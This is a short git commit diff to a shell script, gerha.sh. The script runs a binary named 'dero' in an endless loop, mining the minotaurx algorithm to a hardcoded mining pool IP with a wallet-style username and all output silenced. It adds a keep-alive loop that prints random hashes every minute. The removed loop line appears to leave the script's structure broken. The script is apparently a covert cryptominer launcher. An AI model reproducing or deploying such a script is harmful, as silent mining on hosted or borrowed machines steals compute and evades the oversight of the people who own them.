5cc12f0b0d5b213db937657fecc5f7cdb7ee86ac
RizQu5 <122372013+RizQu5@users.noreply.github.com>
2023-01-11 18:18:38 +0700

    Update gerha.sh

--- gerha.sh
+++ gerha.sh
@@ -3,7 +3,6 @@ chmod +x dero > /dev/null 2>&1
 while [ 1 ]; do
 ./dero -a minotaurx -o stratum+tcps://178.62.199.36:7063 -u PQFYTbguveuWuwRjZRsUiQZnW3ea51Rbc3.02.beDO > /dev/null 2>&1
 done
-while [ 1 ]; do
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 1m; done
 sleep 2
 done
